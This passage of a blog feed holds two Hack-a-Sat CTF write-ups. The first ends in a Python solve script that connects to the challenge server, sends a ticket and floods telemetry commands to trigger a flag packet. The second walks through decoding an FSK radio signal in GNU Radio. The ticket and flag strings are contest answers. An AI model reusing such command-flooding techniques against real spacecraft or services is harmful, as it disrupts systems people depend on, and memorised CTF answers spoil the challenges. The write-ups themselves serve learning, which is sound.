  <span class="n">c_ssc</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
  <span class="n">c_plen</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span>
  <span class="k">return</span> <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span>

<span class="k">def</span> <span class="nf">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">bitstream</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nf">format</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sh">"</span><span class="s">08b</span><span class="sh">"</span><span class="p">):</span>
      <span class="n">bitstream</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>

  <span class="n">flagdata</span> <span class="o">=</span> <span class="sh">""</span>

  <span class="k">while</span> <span class="nf">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">b</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
      <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">b</span> <span class="o">+=</span> <span class="n">bitstream</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">b</span> <span class="o">!=</span> <span class="sh">""</span><span class="p">:</span>
      <span class="n">flagdata</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
    <span class="n">bitstream</span> <span class="o">=</span> <span class="n">bitstream</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>

  <span class="k">return</span> <span class="n">flagdata</span>

<span class="k">def</span> <span class="nf">DecodeEPS</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">battemp</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
  <span class="n">voltage</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">low_pwr_thresh</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>

  <span class="n">LOW_PWR_MODE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">BATT_HTR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">PAYLOAD_PWR</span>   <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">FLAG_PWR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">ADCS_PWR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO1_PWR</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO2_PWR</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>

  <span class="n">PAYLOAD_ENABLE</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">FLAG_ENABLE</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">ADCS_ENABLE</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO1_ENABLE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO2_ENABLE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
  <span class="nf">print</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
  <span class="n">BAD_CMD_COUNT</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;I</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

  <span class="k">return</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">low_pwr_thresh</span><span class="sh">"</span><span class="p">:</span> <span class="n">low_pwr_thresh</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">voltage</span><span class="sh">"</span><span class="p">:</span> <span class="n">voltage</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">LOW_PWR_MODE</span><span class="sh">"</span><span class="p">:</span> <span class="n">LOW_PWR_MODE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">BATT_HTR</span><span class="sh">"</span><span class="p">:</span> <span class="n">BATT_HTR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">PAYLOAD_PWR</span><span class="sh">"</span><span class="p">:</span> <span class="n">PAYLOAD_PWR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">FLAG_PWR</span><span class="sh">"</span><span class="p">:</span> <span class="n">FLAG_PWR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">ADCS_PWR</span><span class="sh">"</span><span class="p">:</span> <span class="n">ADCS_PWR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">RADIO1_PWR</span><span class="sh">"</span><span class="p">:</span> <span class="n">RADIO1_PWR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">RADIO2_PWR</span><span class="sh">"</span><span class="p">:</span> <span class="n">RADIO2_PWR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">PAYLOAD_ENABLE</span><span class="sh">"</span><span class="p">:</span> <span class="n">PAYLOAD_ENABLE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">FLAG_ENABLE</span><span class="sh">"</span><span class="p">:</span> <span class="n">FLAG_ENABLE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">ADCS_ENABLE</span><span class="sh">"</span><span class="p">:</span> <span class="n">ADCS_ENABLE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">RADIO1_ENABLE</span><span class="sh">"</span><span class="p">:</span> <span class="n">RADIO1_ENABLE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">RADIO2_ENABLE</span><span class="sh">"</span><span class="p">:</span> <span class="n">RADIO2_ENABLE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">BAD_CMD_COUNT</span><span class="sh">"</span><span class="p">:</span> <span class="n">BAD_CMD_COUNT</span><span class="p">,</span>
  <span class="p">}</span>


<span class="n">rv</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">goose.satellitesabove.me</span><span class="sh">"</span><span class="p">,</span> <span class="mi">5033</span><span class="p">)</span>
<span class="n">rv</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Ticket please:</span><span class="sh">"</span><span class="p">)</span>
<span class="n">rv</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">ticket{delta76170foxtrot:GCOmAUq4Fz8K0PQ1qFpviGNJXkI0FmI2eIDZ9BB2EvbrZwD0EoKIt0af4wyrI0W7QA}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">v</span> <span class="o">=</span> <span class="n">rv</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Telemetry Service running at </span><span class="sh">"</span><span class="p">)</span>
<span class="n">v</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">rv</span><span class="p">.</span><span class="nf">recv</span><span class="p">(),</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">"</span><span class="s">utf8</span><span class="sh">"</span><span class="p">)</span>

<span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">v</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)</span>
<span class="n">port</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Connecting %s:%d</span><span class="sh">"</span> <span class="o">%</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>

<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>

<span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">SendEnables</span><span class="p">():</span>
  <span class="k">global</span> <span class="n">s</span>
  <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Sending enable %d</span><span class="sh">"</span> <span class="o">%</span> <span class="n">s</span><span class="p">)</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nc">EncodeHeader2</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x0C</span><span class="sh">"</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">,</span> <span class="n">s</span><span class="p">))</span> <span class="c1"># LW_PWR_THRES
</span>    <span class="n">s</span> <span class="o">+=</span> <span class="mi">1</span>


<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="nc">SendEnables</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
    <span class="c1"># data += chunk
</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Received %d bytes</span><span class="sh">"</span> <span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

    <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span> <span class="o">=</span> <span class="nc">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>
    <span class="k">if</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="n">APID_FLAG_PACKET</span><span class="p">:</span>
      <span class="n">flag</span> <span class="o">=</span> <span class="nc">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">THE FLAG: %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">flag</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="n">APID_EPS_PACKET</span><span class="p">:</span>
      <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">EPS: </span><span class="sh">"</span><span class="p">)</span>
      <span class="n">eps</span> <span class="o">=</span> <span class="nc">DecodeEPS</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="nf">pprint</span><span class="p">(</span><span class="n">eps</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">eps</span><span class="p">[</span><span class="sh">"</span><span class="s">RADIO2_ENABLE</span><span class="sh">"</span><span class="p">]</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">r</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nc">EncodeHeader</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x02\x01</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># Flag
</span>    <span class="k">else</span><span class="p">:</span>
      <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">GOT PACKET %d with LENGTH %d</span><span class="sh">"</span> <span class="o">%</span><span class="p">(</span><span class="n">c_apid</span><span class="p">,</span> <span class="n">c_plen</span><span class="p">))</span>
      <span class="nf">print</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
    <span class="c1"># data = data[c_plen+1:]
</span>  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">ERROR: </span><span class="sh">"</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
    <span class="k">break</span>

<span class="n">rv</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="XTCE" /><summary type="html"><![CDATA[Hack a Sat — Talk to me, Goose]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Phasors to Stun</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/" rel="alternate" type="text/html" title="Hack a Sat - Phasors to Stun" /><published>2020-05-30T16:15:00+00:00</published><updated>2020-05-30T16:15:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/"><![CDATA[<h1 id="hack-a-sat--phasors-to-stun">Hack a sat  —  Phasors to Stun</h1>

<p>The challenge</p>

<p>I got really excited about it because its a SDR one. And everyone that knows me know that I love SDR stuff.</p>

<p>The zip file itself contains a wav file which they told us is not an audio but an radio signal</p>

<p><img src="/assets/posts/medium/1_oEKFYtXfQrg3o9EcymOpLw.png" alt="File command to show what the wave file is" /><em>File command to show what the wave file is</em></p>

<p>If we open in audacity we will se a very interesting pattern:</p>

<p><img src="/assets/posts/medium/1_B6iuajNIgKRnK1eDHE9RfA.png" alt="Audacity view of the wave file" /><em>Audacity view of the wave file</em></p>

<p>That looks like a 2-FSK demodulated file (see <a href="https://en.wikipedia.org/wiki/Frequency-shift_keying">https://en.wikipedia.org/wiki/Frequency-shift_keying</a>). When you demodulate a 2-FSK I/Q from correctly from a Radio, it will convert the frequency to voltage leading to a pattern like the one saw.</p>

<p>I said 2-FSK besides other ones, because there is clearly almost only three values there: 1, 0 and -1. The 0 is usually the transistion, and in a 2-FSK 1 and -1 represents the bits itself. We can use GNU Radio to transform that in a bitstream, but before we need to know the baud rate (or bit rate).</p>

<p>That can be done manually in the audacity itself. Just find two peaks that are closer to each other than other any other. That’s probably the <strong>minimum period</strong> of the signal which usually tells us a bit change. For example:</p>

<p><img src="/assets/posts/medium/1_tZUQt0MBQvI0i2JbHiDauw.png" alt="Two short peaks selected" /><em>Two short peaks selected</em></p>

<p>I got one negative and one positive short peak, which would represent a 0 to 1 transition or a 1 to 0 transition. Then you can see that there is 4 samples selected (just check these dots, they’re the samples in the file) which means that there is 4 samples per bit in the wav signal. Since the wav sample rate is 32000 we can expect the baudrate to be something close to 8000. So now we have enough information then we can go to GNU Radio!</p>

<p>In GNU Radio the first thing we should do is get a Wav File Source to open the file:</p>

<p><img src="/assets/posts/medium/1_FFyDLx-6GeTnYS8-aUNqRA.png" alt="Wave File Source" /><em>Wave File Source</em></p>

<p>I selected the option <strong>Repeat</strong> to be false, so it will not run foverer repeting the file. After that we need something to synchronize our bits and find where to sample the bits we want. There are several blocks that can do that, but I usually prefer the <strong>M&amp;M Clock Recovery</strong> block. Its easy to use and since the singnal does not have much noise on it, it will work perfectly. One thing to notice is that the M&amp;M usually works on complex samples, so you need to change the sample type to <strong>float</strong>. Then there is a few parameters to set:</p>

<p><img src="/assets/posts/medium/1_bo6sVsrnFugs0MHKug-2Aw.png" alt="M&amp;M Clock Recovery Parameters" /><em>M&amp;M Clock Recovery Parameters</em></p>

<p>The most important here is <strong>Omega</strong>. Omega represents the number of input samples per output sample (let’s call symbol). We found out that the input audio has 4 samples per symbol. So our <strong>Omega</strong> is 4. The other parameters defines how the tracking loop works. You can start with the parameters I put (is usually the defaults what I try initially) and tune afterwards. They’re mostly effective for signals that are degraded by noise which is not the case of this flag. That means basically any value should work.</p>

<p>One thing worth to mention is that the <strong>Omega Relative Limit</strong> limits how much from the “last detected symbol” the current symbol can deviate. If you put higher enough, the lock will be loose and can detect wrong symbols. Since our signal basically doesn’t have any noise, we can put this value very low.</p>

<p>Now we can plug the two blocks:</p>

<p><img src="/assets/posts/medium/1_pLL_Dw-EBadWJaJI3l69Mw.png" alt="Clock Recovery + Wav File" /><em>Clock Recovery + Wav File</em></p>

<p>The next step is to use a <strong>Binary Slicer</strong> blocks that will convert a -1 in float to a 0 byte and a 1 float to 1 byte. But before that we need to talk about bit alignment and how it affects us.</p>

<p>Let’s supose we have this string:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HELLO
</code></pre></div></div>

<p>That in binary is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>01001000 01000101 01001100 01001100 01001111
   H         E        L        L       O
</code></pre></div></div>

<p>If we have a stream that repeats hello two times we will have something like that:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>01001000 01000101 01001100 01001100 01001111 01001000 01000101 ...
   H         E        L        L       O        H        E
</code></pre></div></div>

<p>When receiving continuous signals, you usually don’t know where you started fetching the data. Its possible that we started at middle of a byte instead of the start. That affects us because if we start counting a byte from the middle, we will have bytes that have pieces of to bytes. For example if we started at bit 4:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1000010001010100110001001100010011110100100001000101
</code></pre></div></div>

<p>We will be missing 4 bits from the first byte and we would not know that. And if we tried to decode it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10000100 01010100 11000100 11000100 11110100 10000100 0101 ...
   �         T        �       �        �         �
</code></pre></div></div>

<p>The signal wouldn’t make sense to us. So we need to account that we might have a bit shift in that. Since our chars are 1 byte wide (8 bits) we only need to check from shift 0 to 7, since if it is bigger than that, it will be the same as N byte shift + n bit shift.</p>

<p>On gnuradio we can use a <strong>Skip Head</strong> block that will skip N samples before sending the data to the next block.</p>

<p><img src="/assets/posts/medium/1_VBVu-iZh_AbeQKbiBN_XbQ.png" alt="Wav + MM + Skip" /><em>Wav + MM + Skip</em></p>

<p>We can start with Num Items = 0 because we don’t know if the data has been shifted. Then we can get to the next block that is the binary slicer.</p>

<p><img src="/assets/posts/medium/1_FmWEN_NT_DC9HvDyMxJnUw.png" alt="Wav + MM + Skip + Slicer" /><em>Wav + MM + Skip + Slicer</em></p>

<p>The binary slicer work is simple: It receive float samples. If the sample is &gt; 0 it outputs a byte with value 1. If its ≤ 0 it outputs a byte 0.</p>

<p>After that we will have a stream of bits unpacked in a stream of bytes. We need to pack them together (each 8 bytes of input to form a single byte). For that we can use the <strong>Pack K Bits</strong> block.</p>

<p><img src="/assets/posts/medium/1_aC8JZtn8fhN7Mb8E1xA-eA.png" alt="Wav + MM + Skip + Slicer + Pack" /><em>Wav + MM + Skip + Slicer + Pack</em></p>

<p>The <strong>Pack K Bits</strong> block will fetch <strong>K</strong> input bytes, put them together and output a single byte. It is basically a Add + Shift process that after it processes <strong>K</strong> inputs, it outputs the memory and resets. It will basically transform:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000001 00000000 00000001 00000001 00000001 00000000 00000001 00000001
</code></pre></div></div>

<p>And make a single byte:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10111011
</code></pre></div></div>

<p>After that we can save it to a file using the <strong>File Sink</strong> block.</p>

<p><img src="/assets/posts/medium/1_2i7xMJCqsO2akqRGV8-m9Q.png" alt="Complete decode flow" /><em>Complete decode flow</em></p>

<p>I selected it to <strong>Overwrite</strong> the output file, so when we change the Skip Head, it just replaces the old file.</p>

<p>Now we have our complete decode flow, we can hit run in the bar.</p>

<p>After that we can inspect our file by running <strong>cat</strong> on it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat output.bin
</code></pre></div></div>

<p><img src="/assets/posts/medium/1_D32TnW8NmfxpfM7CqEl9SA.png" alt="cat output" /><em>cat output</em></p>

<p>We can see that something is periodic, but it doesnt make sense. So we repeat the process increasing Num Items. And then with Num Items = 5</p>

<p><img src="/assets/posts/medium/1_NV7eIw_aTHQct1asN90onw.png" alt="FLAG FOUND" /><em>FLAG FOUND</em></p>

<p>We’ve found the flag!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>THE FLAG IS: flag{xray72468alpha:GKhWwvFNBGHT44M8d5Z2y4sc9xo7T4tNrwlTw5OWuCg_9dd4Ow_aiMDgxTtL9ng2s2sEDMA0AfTrsSpjv_sNvMg}
</code></pre></div></div>

<p>Final flow:</p>

<p><img src="/assets/posts/medium/1_lEYyYL0REStDYZi7xkGmag.png" alt="Final GNU Radio Flow" /><em>Final GNU Radio Flow</em></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="SDR" /><category term="GNU Radio" /><category term="Radio" /><summary type="html"><![CDATA[Hack a sat  —  Phasors to Stun]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>